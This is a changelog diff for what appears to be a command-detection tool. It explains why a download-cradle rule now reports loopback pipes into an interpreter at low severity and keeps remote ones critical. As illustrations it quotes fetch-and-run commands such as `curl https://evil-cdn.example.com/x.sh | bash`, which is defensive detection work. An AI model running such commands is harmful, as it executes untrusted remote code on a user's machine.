@@ -10,6 +10,30 @@ separately (currently `1.1.0`) and changes additively.
 ## [Unreleased]
 
 ### Fixed
+- **`encoded-command-download` fired critical on piping a loopback service into
+  an interpreter** (#38). `curl http://127.0.0.1:8000/... | python` has the exact
+  shape of a download cradle and none of the substance, and developers query
+  their own services that way several times an hour. A critical that fires that
+  often becomes the alert people scroll past, so the rule loses its reader before
+  a real cradle ever appears.
+
+  A new `pipe_to_shell_local` trait marks pipes whose every URL is loopback, and
+  the rule reports those at low with `T1059` only. No `T1105` and no `TA0011`:
+  both mean content arriving from outside, and claiming either for a loopback
+  fetch would put a false ATT&CK mapping in front of an analyst. It is downgraded
+  rather than suppressed, because staging a payload on a local port and then
+  executing it is a real technique.
+
+  Loopback is excluded specifically rather than remote being required, which
+  preserves an earlier fix: demanding a bare IP once let
+  `curl https://evil-cdn.example.com/x.sh | bash` through, and a domain is what a
+  real attacker uses. A command whose URL cannot be read, such as
+  `curl $URL | bash`, is treated as remote.
+
+  Corpus gains both halves, and the cradle tests now assert severity rather than
+  only that something fired: a careless fix treating every pipe as local would
+  otherwise still "detect" a real cradle, at low, and pass.
+
 - **Replayed events were stamped with the time of the replay, not the time of
   the tool call.** The hook sent no timestamp, so the orchestrator fell back to
   its own clock. That is accurate to the millisecond while ingest is live and
